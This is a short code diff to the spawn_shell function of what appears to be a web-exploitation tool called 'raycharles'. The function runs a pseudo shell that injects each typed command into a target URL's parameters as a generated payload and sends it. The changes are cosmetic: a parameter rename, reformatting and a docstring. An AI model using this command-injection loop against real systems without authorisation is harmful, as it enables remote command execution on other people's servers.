@@ -7,14 +7,19 @@ from raycharles.payloads import PayloadGenerator
 
 
 def spawn_shell(
-    console: Console, session: httpx.Client, url: str, payload_fnc: PayloadGenerator
+    console: Console,
+    session: httpx.Client,
+    url: str,
+    payload_func: PayloadGenerator
 ):
+    """ Pseudo shell to facilitate commands execution """
+
     splitted_url = detect_parameters(url)
 
     while True:
         try:
             user_input = console.input("raycharles> ")
-            payload = payload_fnc(user_input)
+            payload = payload_func(user_input)
 
             final_url = ""
 
@@ -25,6 +30,7 @@ def spawn_shell(
                     final_url += part
 
             session.get(final_url)
+
             console.log("Request sent!")
         except KeyboardInterrupt:
             return
